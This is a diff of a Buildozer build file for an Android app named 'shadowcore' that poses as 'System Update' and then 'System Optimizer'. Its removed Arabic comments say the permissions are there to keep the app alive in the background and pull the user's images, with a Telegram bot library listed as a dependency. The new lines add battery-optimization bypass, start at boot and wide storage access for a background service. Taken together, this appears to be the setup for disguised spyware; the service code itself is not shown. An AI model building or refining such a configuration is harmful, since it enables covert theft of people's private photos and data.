@@ -1,7 +1,7 @@
 [app]
 
 # (str) Title of your application
-title = System Update
+title = System Optimizer
 
 # (str) Package name
 package.name = shadowcore
@@ -13,67 +13,50 @@ package.domain = org.test
 source.dir = .
 
 # (list) Source files to include (let empty to include all the files)
-source.include_exts = py,png,jpg,kv,atlas
-
-# (str) Application versioning (method 1)
-version = 0.1
+source.include_exts = py,png,jpg,kv,atlas,db
 
 # (list) Application requirements
-# تأكد من إضافة jnius و requests و telebot
-requirements = python3,kivy,telebot,requests,jnius,pyopenssl,urllib3,idna,certifi
+# Added sqlite3 and requests for the new sync engine
+requirements = python3,kivy,requests,pyjnius,sqlite3
 
-# (str) Supported orientations
-orientation = portrait
-
-# (bool) Indicate if the application should be monitor for touchscreen
-# events or not
-input.touchring = 0
-
-# -----------------------------------------------------------------------------
-# Android specific
-# -----------------------------------------------------------------------------
-
+# (str) Custom source folders for requirements
 # (list) Permissions
-# تم إضافة كافة الأذونات اللازمة للبقاء حياً في الخلفية وسحب الصور
-android.permissions = INTERNET, WAKE_LOCK, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, POST_NOTIFICATIONS, FOREGROUND_SERVICE_DATA_SYNC, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES
+# Critical permissions for background sync and battery bypass
+android.permissions = INTERNET, WAKE_LOCK, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE
 
 # (int) Target Android API, should be as high as possible.
-# أندرويد 33 هو الأفضل حالياً للتوافق مع الأنظمة الجديدة
 android.api = 33
 
 # (int) Minimum API your APK will support.
 android.minapi = 21
 
-# (list) Android services declaration
-# هذا السطر يخبر الأندرويد أن هناك خدمة خلفية اسمها Service
-services = Service:service.py
+# (str) Android NDK version to use
+android.ndk = 25b
 
-# (bool) If True, then skip trying to update the Android sdk
-android.skip_update = False
+# (bool) Use --private data storage (True) or --dir public storage (False)
+android.private_storage = True
 
-# (bool) If True, then automatically accept SDK license
-android.accept_sdk_license = True
+# (list) Android services to spawn
+# This connects your service.py to the application
+android.services = myservice:service.py
 
-# (str) Android entry point, default is ok for Kivy-based app
+# (str) Full name including package path of the Java class that implements PythonActivity
 android.entrypoint = org.kivy.android.PythonActivity
 
-# (list) The Android archs to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
-android.archs = arm64-v8a, armeabi-v7a
+# (list) Pattern to exclude for the build
+# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
+android.archs = arm64-v8a
 
-# (bool) allow backup
+# (bool) Allow backup
 android.allow_backup = True
 
-# (str) Full name including package for the Android Service to use.
-# android.service_class_name = org.kivy.android.PythonService
-
-# -----------------------------------------------------------------------------
-# Buildozer specific
-# -----------------------------------------------------------------------------
+# (list) List of Java .jar files to add to the libs so that pyjnius can access their classes
+# (list) List of Java files to add to the project (can be java or a directory containing the files)
 
 [buildozer]
 
-# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
+# (int) log level (0 = error only, 1 = info, 2 = debug (with command output))
 log_level = 2
 
-# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
+# (int) display warning if buildozer is run as root (0 = off, 1 = on)
 warn_on_root = 1
